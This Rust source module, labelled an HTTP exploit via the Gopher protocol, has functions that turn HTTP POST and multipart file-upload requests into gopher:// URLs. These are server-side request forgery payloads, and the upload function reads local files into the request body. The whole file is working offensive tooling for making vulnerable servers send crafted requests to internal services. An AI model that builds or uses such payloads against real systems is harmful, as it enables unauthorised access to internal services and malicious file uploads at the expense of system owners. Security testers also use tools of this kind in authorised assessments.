//! HTTP exploit via Gopher protocol

use anyhow::Result;
use std::collections::HashMap;
use std::fs;

/// Generate Gopher HTTP POST exploit payload
pub fn gopher_http_post_exp(addr: &str, uri: &str, data: &HashMap<String, String>) -> Result<String> {
    // Build form data
    let form_data: Vec<String> = data
        .iter()
        .map(|(k, v)| format!("{}={}", urlencoding::encode(k), urlencoding::encode(v)))
        .collect();
    let body = form_data.join("&");

    let headers = [format!("POST {uri} HTTP/1.1"),
        format!("Host: {addr}"),
        "Content-Type: application/x-www-form-urlencoded".to_string(),
        format!("Content-Length: {}", body.len())];

    let request = format!("{}\r\n\r\n{}", headers.join("\r\n"), body);
    let encoded = urlencoding::encode(&request).replace('+', "%20");

    Ok(format!("gopher://{addr}/_{encoded}"))
}

/// Generate a random boundary string
fn generate_boundary() -> String {
    use rand::Rng;
    let mut rng = rand::rng();
    let random_bytes: Vec<u8> = (0..16).map(|_| rng.random::<u8>()).collect();
    format!("----WebKitFormBoundary{}", hex::encode(random_bytes))
}

/// Generate Gopher HTTP file upload exploit payload
pub fn gopher_http_upload_exp(addr: &str, uri: &str, data: &HashMap<String, String>) -> Result<String> {
    let boundary = generate_boundary();
    let mut body_parts: Vec<String> = Vec::new();

    for (key, value) in data {
        if value.starts_with('@') {
            // File upload
            let filename = value.trim_start_matches('@');
            let file_content = fs::read_to_string(filename).unwrap_or_else(|_| {
                // If file doesn't exist, use the filename as content
                format!("File content of {filename}")
            });

            body_parts.push(format!(
                "--{boundary}\r\nContent-Disposition: form-data; name=\"{key}\"; filename=\"{filename}\"\r\nContent-Type: application/octet-stream\r\n\r\n{file_content}"
            ));
        } else {
            // Regular field
            body_parts.push(format!(
                "--{boundary}\r\nContent-Disposition: form-data; name=\"{key}\"\r\n\r\n{value}"
            ));
        }
    }

    body_parts.push(format!("--{boundary}--"));
    let body = body_parts.join("\r\n");

    let content_type = format!("multipart/form-data; boundary={boundary}");
    let headers = [format!("POST {uri} HTTP/1.1"),
        format!("Host: {addr}"),
        format!("Content-Type: {content_type}"),
        format!("Content-Length: {}", body.len())];

    let request = format!("{}\r\n\r\n{}", headers.join("\r\n"), body);
    let encoded = urlencoding::encode(&request).replace('+', "%20");

    Ok(format!("gopher://{addr}/_{encoded}"))
}

